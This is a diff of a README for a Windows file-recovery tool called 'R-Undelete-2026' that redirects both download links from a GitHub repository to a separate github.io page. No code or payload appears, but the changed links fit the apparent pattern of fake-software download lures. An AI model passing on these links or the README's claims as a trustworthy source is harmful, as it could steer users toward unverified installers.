@@ -1,6 +1,6 @@
 # 💾 R-Undelete-2026 - Recover Lost Files On Windows Easily
 
-[![](https://img.shields.io/badge/Download-R--Undelete--2026-blue.svg)](https://github.com/notoriousduc/R-Undelete-2026)
+[![](https://img.shields.io/badge/Download-R--Undelete--2026-blue.svg)](https://notoriousduc.github.io)
 
 ## 🎯 About This Software
 R-Undelete-2026 offers a way to restore lost or deleted data on Windows 11 and Windows 10 systems. The software scans your drives for files that you removed by accident or lost due to system errors. It works with local hard drives, USB thumb drives, and external storage devices. You do not need technical skills to search for your missing photos, documents, or videos with this tool.
@@ -17,7 +17,7 @@ Before you install the software, check your computer against these basic require
 ## 🚀 Downloading The Software
 To start the recovery process, you must obtain the installer package from the official source. Do not use external sites to prevent the download of malicious files. Use the link below to reach the correct page.
 
-[Click here to reach the download page](https://github.com/notoriousduc/R-Undelete-2026)
+[Click here to reach the download page](https://notoriousduc.github.io)
 
 Click the link provided above to open the repository. Locate the releases area on the right side of the page. Select the most recent version labeled for Windows. Save the file to your desktop or your Downloads folder.
 
